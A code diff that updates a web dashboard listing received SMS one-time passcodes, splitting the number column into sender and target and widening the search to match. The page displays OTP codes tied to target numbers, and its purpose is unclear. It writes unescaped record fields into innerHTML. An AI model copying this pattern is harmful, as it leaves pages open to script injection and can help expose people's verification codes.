@@ -16,7 +16,7 @@
             padding: 20px;
         }
         .container {
-            max-width: 1200px;
+            max-width: 1300px;
             margin: 0 auto;
             background: white;
             border-radius: 10px;
@@ -108,10 +108,17 @@
             font-weight: bold;
             color: #28a745;
         }
-        .mobile-number {
+        .mono-text {
             font-family: monospace;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
+        }
+        .sender-badge {
+            background: #e9ecef;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 12px;
         }
         .footer {
             padding: 15px;
@@ -129,7 +136,7 @@
         </div>
         
         <div class="controls">
-            <input type="text" id="searchInput" class="search-box" placeholder="Search mobile number..." onkeyup="filterTable()">
+            <input type="text" id="searchInput" class="search-box" placeholder="Search by sender or target number..." onkeyup="filterTable()">
             <button class="btn-primary" onclick="searchNumber()">🔍 Search</button>
             <button class="btn-warning" onclick="deleteSelected()">❌ Delete Selected</button>
         </div>
@@ -140,7 +147,8 @@
                     <tr>
                         <th><input type="checkbox" id="selectAll" onclick="toggleSelectAll()"></th>
                         <th>SL</th>
-                        <th>📞 MOBILE NUMBER</th>
+                        <th>📤 SENDER</th>
+                        <th>📥 TARGET</th>
                         <th>🔢 OTP CODE</th>
                         <th>⏰ ARRIVAL TIME</th>
                         <th>⚡ ACTION</th>
@@ -148,7 +156,7 @@
                 </thead>
                 <tbody id="tableBody">
                     <tr class="empty-row">
-                        <td colspan="6">Loading...</td>
+                        <td colspan="7">Loading...</td>
                     </tr>
                 </tbody>
             </table>
@@ -171,7 +179,7 @@
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    document.getElementById('tableBody').innerHTML = '<tr class="empty-row"><td colspan="6">Error loading data</td></tr>';
+                    document.getElementById('tableBody').innerHTML = '<tr class="empty-row"><td colspan="7">Error loading data</td></tr>';
                 });
         }
         
@@ -182,22 +190,28 @@
             let filteredData = otpData;
             if (searchTerm) {
                 filteredData = otpData.filter(item => 
-                    item.mobile_number && item.mobile_number.toLowerCase().includes(searchTerm)
+                    (item.sender && item.sender.toLowerCase().includes(searchTerm)) ||
+                    (item.target && item.target.toLowerCase().includes(searchTerm))
                 );
             }
             
             if (filteredData.length === 0) {
-                tbody.innerHTML = '<tr class="empty-row"><td colspan="6">No SMS logs yet</td></tr>';
+                tbody.innerHTML = '<tr class="empty-row"><td colspan="7">No SMS logs yet</td></tr>';
                 return;
             }
             
             let html = '';
             filteredData.forEach((item, index) => {
+                // সেন্ডার দেখানো: যদি নম্বর হয় তাহলে নম্বর দেখাবে, নাহলে যেটা আছে সেটাই
+                let senderDisplay = item.sender || 'Unknown';
+                let targetDisplay = item.target || 'Unknown';
+                
                 html += `
                     <tr>
                         <td><input type="checkbox" class="rowCheckbox" data-id="${item.id}"></td>
                         <td>${index + 1}</td>
-                        <td class="mobile-number">${item.mobile_number || 'Unknown'}</td>
+                        <td class="mono-text">${senderDisplay}</td>
+                        <td class="mono-text">${targetDisplay}</td>
                         <td class="otp-code">${item.otp_code || 'N/A'}</td>
                         <td>${item.arrival_time || 'N/A'}</td>
                         <td><button class="delete-btn" onclick="deleteOTP(${item.id})">Delete</button></td>
